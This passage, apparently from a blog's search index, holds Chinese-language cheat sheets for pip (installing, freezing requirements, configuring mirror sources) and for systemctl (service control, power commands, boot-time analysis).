<h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">pip list			<span class="meta"># 显示已安装的库</span></span><br><span class="line">pip list -o			<span class="meta"># 显示已过时的库</span></span><br><span class="line">pip <span class="keyword">show</span> &lt;<span class="keyword">library</span>&gt;		<span class="meta"># 显示库信息</span></span><br><span class="line">pip install &lt;<span class="keyword">library</span>&gt;		<span class="meta"># 安装库</span></span><br><span class="line">pip install -U &lt;<span class="keyword">library</span>&gt;	<span class="meta"># 更新库</span></span><br><span class="line">pip uninstall &lt;<span class="keyword">library</span>&gt;		<span class="meta"># 卸载库</span></span><br><span class="line">pip check &lt;<span class="keyword">library</span>&gt;		<span class="meta"># 检查依赖</span></span><br><span class="line">pip [cmd] -h			<span class="meta"># 显示帮助</span></span><br></pre></td></tr></table></figure>

<h2 id="导出已安装包"><a href="#导出已安装包" class="headerlink" title="导出已安装包"></a>导出已安装包</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">freeze</span> &gt; requirements.txt</span><br></pre></td></tr></table></figure>

<h2 id="从文件递归安装"><a href="#从文件递归安装" class="headerlink" title="从文件递归安装"></a>从文件递归安装</h2><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> -r requirements.txt</span><br></pre></td></tr></table></figure>

<h2 id="其它配置"><a href="#其它配置" class="headerlink" title="其它配置"></a>其它配置</h2><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置默认使用pip3</span></span><br><span class="line">pip3 intall <span class="comment">--upgrade pip</span></span><br></pre></td></tr></table></figure>



<h2 id="源配置"><a href="#源配置" class="headerlink" title="源配置"></a>源配置</h2><h3 id="临时使用"><a href="#临时使用" class="headerlink" title="临时使用"></a>临时使用</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">pip install <span class="selector-attr">[module]</span> -<span class="selector-tag">i</span> https:<span class="comment">//pypi.org/simple</span></span><br></pre></td></tr></table></figure>

<h3 id="全局配置"><a href="#全局配置" class="headerlink" title="全局配置"></a>全局配置</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 官方源</span></span><br><span class="line">pip config <span class="built_in">set</span> global.index-url https://pypi.org/simple</span><br><span class="line"></span><br><span class="line"><span class="comment"># 阿里源</span></span><br><span class="line">pip config <span class="built_in">set</span> global.index-url https://mirrors.aliyun.com/pypi/simple</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清华源</span></span><br><span class="line">pip config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"></span><br><span class="line"><span class="comment"># 腾讯源</span></span><br><span class="line">pip config <span class="built_in">set</span> global.index-url http://mirrors.cloud.tencent.com/pypi/simple</span><br><span class="line"></span><br><span class="line"><span class="comment"># 豆瓣源</span></span><br><span class="line">pip config <span class="built_in">set</span> global.index-url http://pypi.douban.com/simple</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>命令文档</category>
      </categories>
      <tags>
        <tag>pip</tag>
      </tags>
  </entry>
  <entry>
    <title>systemctl 命令</title>
    <url>/systemctl/</url>
    <content><![CDATA[<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start &lt;servicename&gt;    	<span class="comment"># 启动服务</span></span><br><span class="line">systemctl stop &lt;servicename&gt;     	<span class="comment"># 关闭服务</span></span><br><span class="line">systemctl restart &lt;servicename&gt;		<span class="comment"># 重启服务</span></span><br><span class="line">systemctl reload &lt;servicename&gt;    	<span class="comment"># 重新加载配置文件</span></span><br><span class="line">systemctl status &lt;servicename&gt;    	<span class="comment"># 查看服务状态</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看服务的配置文件</span></span><br><span class="line">systemctl <span class="built_in">cat</span> &lt;servicename&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有服务的状态</span></span><br><span class="line">systemctl -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出当前系统服务状态</span></span><br><span class="line">systemctl list-units</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出服务的依赖关系</span></span><br><span class="line">systemctl list-dependencies &lt;servicename&gt;</span><br></pre></td></tr></table></figure>



<h2 id="电源相关"><a href="#电源相关" class="headerlink" title="电源相关"></a>电源相关</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl reboot		<span class="comment"># 重启机器</span></span><br><span class="line">systemctl poweroff		<span class="comment"># 关机</span></span><br><span class="line">systemctl <span class="built_in">suspend</span>		<span class="comment"># 挂起 - 睡眠 - 保存在內存</span></span><br><span class="line">systemctl hibernate		<span class="comment"># 休眠 - 断电 - 保存在硬盘</span></span><br><span class="line">systemctl hybrid-sleep		<span class="comment"># 混合休眠模式（同时休眠到硬盘并挂起）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看系统引导时间</span></span><br><span class="line">systemd-analyze time		<span class="comment"># 仅显示时间</span></span><br><span class="line">systemd-analyze blame		<span class="comment"># 显示每个进程消耗时间</span></span><br><span class="line">systemd-analyze plot		<span class="comment"># 生成网页</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>命令文档</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>systemctl</tag>
      </tags>
  </entry>
</search>
